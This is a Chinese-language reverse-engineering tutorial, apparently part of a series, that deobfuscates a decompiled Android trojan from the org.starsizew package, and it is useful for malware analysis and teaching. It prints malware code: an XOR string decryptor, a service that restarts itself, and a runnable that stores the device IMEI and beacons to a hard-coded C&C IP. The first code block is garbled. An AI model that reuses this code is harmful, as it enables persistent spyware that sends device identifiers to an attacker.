    Public final class o {
        Public static String E = new StringBuilder(q(q("}5u0005"))).append(f).append(q(q("C0"))).toString();
        Public static String Q = (b + y + o + y + q(q("C1u00031hL")) + y + s);
        Public static String R = q(q("ru001d$f"));
        Public static String T = q(q("V;u001a="));
        Public static String W = q(q("C>u0016*j"));
        Public static int Y;
        Public static String a = (b + q(q("f3u0007()G*u0003*f")));
        Public static String b = q(q("C i; i++) {
                Int i2;
                Char c = cArr[i];
                Switch (i % 5) {
                    Case 0:
                        I2 = 34;
                        Break;
                    Case 1:
                        I2 = 82;
                        Break;
                    Case 2:
                        I2 = 119;
                        Break;
                    Case 3:
                        I2 = 88;
                        Break;
                    Default:
                        I2 = 7;
                        Break;
                }
                cArr[i] = (char) ((char) (i2 ^ c));
            }
            Return new String(cArr).intern();
        }
        Private static char[] q(String str) {
            Char[] toCharArray = str.toCharArray();
            If (toCharArray.length u0016*j"));
        public static int integerZero;
        public static String AndroidAppExtra = (android + decryptCharArray(decryptString("f3u0007()G*u0003*f")));
        public static String android = decryptCharArray(decryptString("C
    [strings.xml]
    AppPrefs
如果可以加载配置文件，那么恶意程序此前已经处于活动状态，并且可以加载最新的已知配置。
后续，我们将分析用于启动新线程的类。
6.3.2 onBind
该函数没有在服务中实现，因为它只能返回异常。代码如下：
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException(stringError);
    }
请注意，之所以将字符串命名为stringError，是因为在解密时，其中会包含字符串Error。
6.3.3 onDestroy
现在，布尔型的isActive已经有了新的名称，因为它在onCreate函数的分析过程中已经被更改。它声明的intent用于启动名为Tb的服务。这与目前我们正在分析的服务相同。如果服务关闭，则它会自动重启。该功能的代码如下：
    public void onDestroy() {
        super.onDestroy();
        isActive = false;
        Intent intent = new Intent(this, Tb.class);
        intent.setFlags(268435456); 
        startService(intent);
    }
请注意，268435456实际上等于0x10000000，这是FLAG_ACTIVITY_NEW_TASK的常量值，我们可以在Android开发者网站上看到。由于这一标志的存在，服务将作为应用程序中的新任务而启动。
6.3.4 主服务
该服务可以重命名为MainService，因为它是恶意程序内部的主要服务，负责保持自身功能，并确保恶意程序内部工作一切正常。
###  6.4 新线程u
在MainService类的onCreate函数中，创建了一个新线程u，具体如下：
    package org.starsizew;
    final class u implements Runnable {
        final Mainservice mainService;
        u(Mainservice mainService) {
            this.mainService = mainService;
        }
        public final void run() {
            this.mainService.r.postDelayed(this.mainService.t, (long) StringDatabase.integerFalse);
        }
    }
一开始，Android
Studio会产生一个错误。这是由于一个反编译的错误，其中MainService类中的两个字段，都设置为private，而实际上它们应该是public或者protected。在下面的代码中，给出了public的两个字段：
    public Handler r = new Handler();
    public Runnable t = new w(this);
现在，新的类u更具可读性，如下所示：
    package org.starsizew;
    final class u implements Runnable {
        final Mainservice mainService;
        u(Mainservice mainService) {
            this.mainService = mainService;
        }
        public final void run() {
            this.mainService.handler.postDelayed(this.mainService.t, (long) StringDatabase.integerFalse);
        }
    }
名为r的处理程序可以重新命名为handler。由于目前尚不清楚w类的作用，因此无法对runnable进行重命名。要了解u的作用，首先我们需要知道w的作用。请注意，这里的StringDatabase.integerFalse等于0。处理程序启动runnable的延迟等于0毫秒。
###  6.5 类w
类w是可以运行的，这也就意味着，它是作为线程启动的。线程在启动时运行run方法。除了解密功能之外，这个类中没有其他任何内容，具体如下：
    public final void run() {
        boolean z = MainService.e;
        if (!this.mainService.sharedPreferences.contains(StringDatabase.one_ + StringDatabase.inst)) {
            Editor edit = this.mainService.sharedPreferences.edit();
            edit.putInt(StringDatabase.one_ + StringDatabase.inst, StringDatabase.integerTrue);
            edit.putString(w[0], this.mainService.getApplicationContext().getString(2131099653));
            edit.putString(StringDatabase.inst, "1");
            edit.putLong(StringDatabase.time_perehv, 100);
            edit.putString(w[3], new StringBuilder(String.valueOf(this.mainService.getApplicationContext().getString(2131099652))).append(a.q(this.mainService.getApplicationContext()).getDeviceId()).toString());
            edit.putString(new StringBuilder(w[4]).append(StringDatabase.emptyString).append(w[1]).toString(), a.q(this.mainService.getApplicationContext()).getDeviceId());
            edit.apply();
        }
        List arrayList = new ArrayList();
        if (this.mainService.sharedPreferences.getString(StringDatabase.inst, null) == "1") {
            new i(this.mainService.getApplicationContext(), arrayList, StringDatabase.inst + w[5]).execute(new String[]{this.mainService.sharedPreferences.getString(w[0], null)});
        } else {
            new i(this.mainService.getApplicationContext(), arrayList, w[2]).execute(new String[]{this.mainService.sharedPreferences.getString(w[0], null)});
        }
        this.mainService.handler.postDelayed(this, (long) Constants.int50005);
        if (z) {
            StringDatabase.integerZero++;
        }
    }
在后面，我们将会分析函数a所在的类q。函数的上下文目前已经提供了足够的可供分析的内容。
这个类是一个例子，说明了从名为w的字符串数组中替换字符串的重要性。这样一来，就能让我们看到更加清晰的代码。优化后的版本如下：
    public final void run() {
        boolean z = MainService.e;
        if (!this.mainService.sharedPreferences.contains("one_inst")) {
            Editor edit = this.mainService.sharedPreferences.edit();
            edit.putInt("one_inst1");
            edit.putString("url", "http://37.1.207.31/api/?id=7");
            edit.putString("inst", "1");
            edit.putLong("time_perehv", 100);
            edit.putString("id", new StringBuilder("00122".append(a.q(this.mainService.getApplicationContext()).getDeviceId()).toString());
            edit.putString("imei", a.q(this.mainService.getApplicationContext()).getDeviceId());
            edit.apply();
        }
        List arrayList = new ArrayList();
        if (this.mainService.sharedPreferences.getString("inst", null) == "1") {
            new i(this.mainService.getApplicationContext(), arrayList, "install").execute(new String[]{this.mainService.sharedPreferences.getString("url", null)});
        } else {
            new i(this.mainService.getApplicationContext(), arrayList, "info").execute(new String[]{this.mainService.sharedPreferences.getString("url", null)});
        }
        this.mainService.handler.postDelayed(this, 50005);
        if (z) {
            StringDatabase.integerZero++;
        }
    }
首先，检查共享首选项文件是否包含密钥，密钥其中应该包含字符串one_inst。如果为false，则使用C&C
URL、布尔型installation变量、time_perehv、ID以及设备的IMEI来实例化首选项文件。
如果共享首选项文件中包含one_inst值，或者在设置共享首选项文件之后，那么会使用完全相同但只有一个参数不同的参数调用类i，不同的参数是第三个，可以是install，也可以是info。但在分析类i之前，首先将分析类a。
###  6.6 类a
在该类中，包含了两个名为q的函数。请注意，为了简洁起见，我们省略了字符串数组及其解密方法。
第一个函数需要一个上下文对象作为参数：q(Context context)。该功能非常简单，如下所示：
    static TelephonyManager q(Context context) {
        return (TelephonyManager) context.getSystemService(StringDatabase.phone);
    }
首先，请求系统服务电话，这样的功能显而易见。此外，我们可以看一下类型转换，它等同于TelephonyManager。我们对这部分代码进行修改，使其更具可读性，如下所示：
    static TelephonyManager getTelephonyManager(Context context) {
        return (TelephonyManager) context.getSystemService(StringDatabase.phone);
    }
第二个函数需要两个字符串作为参数：q(String str, String
str2)。此外，代码使用反射来调用方法。代码具体如下，其中已经替换了字符串数组中的解密字符串。
    public static boolean q(String str, String str2) {
        try {
            Class cls = Class.forName(StringDatabase.android + ".telephony.SmsManager");